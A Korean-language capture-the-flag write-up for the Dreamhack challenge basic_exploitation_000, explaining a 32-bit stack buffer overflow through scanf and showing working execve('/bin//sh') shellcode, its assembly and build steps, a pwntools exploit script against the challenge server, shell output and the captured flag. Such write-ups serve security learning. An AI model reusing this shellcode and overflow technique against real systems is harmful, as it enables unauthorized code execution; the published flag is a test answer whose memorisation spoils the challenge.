https://honey-push-30b.notion.site/basic_exploitation_000-5a22200952704264b9062a1c88f57d74
# 문제파일 다운로드 및 환경

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0ba923aa-4ca5-47a7-84bf-f728bb225391/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

basic_exploitation_000 문제파일을 다운로드 받을 수 있다.

### **Environment**

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

유의해야할 점은 다음과 같다.

환경이 i386-32-little 이므로 어셈블리어를 32비트로 작성해야함. (중요!)

코드는 아래와 같다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```

이 때 scanf 함수로 버퍼의 크기인 0x80(128)보다 큰 값인 (141)을 입력받고 있고 이로 인해서 버퍼오버플로우가 발생할 수 있다.

32비트이므로 SFP의 크기는 4바이트일 것이므로 132바이트를 덮어쓰고 그 다음 RET주소를 덮어씌울 4바이트까지 총 136바이트로 버퍼 오버플로우를 발생시킬 수 있는데 141바이트를 입력받을 수 있으므로 공격하기에는 충분하다. 

이때 scanf 함수는  \x09, \x0a, \x0b, \x0c, \x0d, \x20 를 읽지 못하므로 쉘코드 중 바이트에서 이게 포함되어 있으면 안된다는 점을 유의 해야한다.

32비트는 스택프레임 포인터의 크기가 32/8 - 4바이트

64비트는 스택프레임 포인터의 크기가 64/8 - 8바이트

버퍼의 크기가 128바이트이므로 132바이트(SFP까지포함)까지 덮어씌워야함.

참고로 중간에 뻘짓을 하며 시간을 보냈는데 0xb가 12인줄 알고 0x8에 0x4를 더해서 왜안되지 하고 있었다 ㅋㅋ;

자 그러면 Return Address Overwirte 문제와는 다르게 쉘 권한을 얻을 수 있는 함수가 코드 내에는 존재하지 않는다. 그러면 어떻게 쉘권한을 얻을 수 있을까?

```c
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

답은 환경에서 찾을 수 있다. 여기서 보면 NX비트가 disabled로 되어있는데 이는 스택, 힙 영역에서실행 권한을 제거 하는 보안을 적용하지 않았다는 것이다.

즉 스택에서 실행권한이 남아있으므로 내가 원하는 함수를 쉘코드로 넣고 RET주소를 쉘코드 시작주소로 덮어서 쉘코드를 실행시킬수 있다는 것이다. 심지어 쉘코드가 시작되는 주소인 버퍼의 주소도 printf로 나에게 알려준다.(매번 바뀐다 고정 값 아님)

따라서 쉘코드를 짜기 위해서 execve(”/bin//sh”,null,null)을 어셈블리어 형태로 구성해 주었다. 

```python
section .text
global _start
_start:
	xor eax,eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	xor ecx,ecx ; ecx = NULL
	xor edx,edx  ; edx = NULL
	mov al, 0x8 ; 
	add al, 0x3 ;
	int 0x80       ; execve("/bin//sh", null, null)
```

이때 유이 해야할점은 al에 mov al, 0xb로 바로 0xb를 넣지 않고 0x8을 넣어준후 0x3을 더해서 0xb로 만들어 주었다. 그 이유는 0xb를 넣어주면 쉘코드에 0xb가 생겨서 scanf가 인식하지 못하는 바이트인 \x09, \x0a, \x0b, \x0c, \x0d, \x20 가 생기기 때문에 0x8을 넣고 0x3을 더하는 방식을 사용했다.

```python
┌──(root💀kali)-[~/바탕화면/basic_exploit_000]
└─# leafpad shell_code.asm
^C
                                                                           
┌──(root💀kali)-[~/바탕화면/basic_exploit_000]
└─# nasm -f elf shell_code.asm                                       130 ⨯
                                                                           
┌──(root💀kali)-[~/바탕화면/basic_exploit_000]
└─# objcopy --dump-section .text=shell_code.bin shell_code.o          
                                                                           
┌──(root💀kali)-[~/바탕화면/basic_exploit_000]
└─# xxd shell_code.bin
00000000: 31c0 682f 2f73 6868 2f62 696e 89e3 31c9  1.h//shh/bin..1.
00000010: 31d2 b008 0403 cd80
```

그리고 컴파일 과정을 통해 shell_code를 출력해보면 scanf가 인식하지 못하는 바이트가 없는 것을 확인할 수 있다.

```python
from pwn import *

p=remote('host3.dreamhack.games',20277)

shellcode=b'\x31\xc0\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x04\x03\xcd\x80'
padding=b'A'*(132-len(shellcode))

data=p.recvuntil(')')
address=data[7:-1]
address=p32(int(address,16)) #16진수 바이트 형식을 10진수로 변환후 p32로 엔디언까지 알아서 변환

payload=shellcode+padding+address

p.sendline(payload)

p.interactive()
```

shellcode를 넣어주고 132바이트 중 shellcode 길이만큼을 뺀 나머지도 덮어줘야하므로 132바이트에서 shellcode길이를 뺀 나머지 만큼 A로 덮어주고 buf의 주소를 받아 알맞게 추출한 뒤 16진수 바이트 형식의 int로 바꾸어서(str로 되어있으므로 이 과정이 필요함) p32함수를 이용해 32비트 형식에 맞게 리틀 엔디언까지 맞춰서 주소를 맞춰주었다.

그리고 쉘 코드 +패딩값(버퍼의 크기+ SFP(스택프레임 포인터))에 RET위치를 버퍼 시작 주소값으로 덮어서 exploit해주면 된다.

```c
──(root💀kali)-[~/바탕화면/basic_exploit_000]
└─# python3 ./answer.py                                              126 ⨯
[+] Opening connection to host3.dreamhack.games on port 20277: Done
/root/바탕화면/basic_exploit_000/./answer.py:8: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  data=p.recvuntil(')')
[*] Switching to interactive mode

$ ls
basic_exploitation_000
flag
run.sh
$ cat flag
DH{465dd453b2a25a26a847a93d3695676d}[*] Got EOF while reading in interactive
```

쉘 권한을 얻었으므로 ls 명령어를 통해 flag가 있음을 알고 cat 명령어를 통해 flag 값을 출력하여 `DH{465dd453b2a25a26a847a93d3695676d}`를 얻을 수 있다.
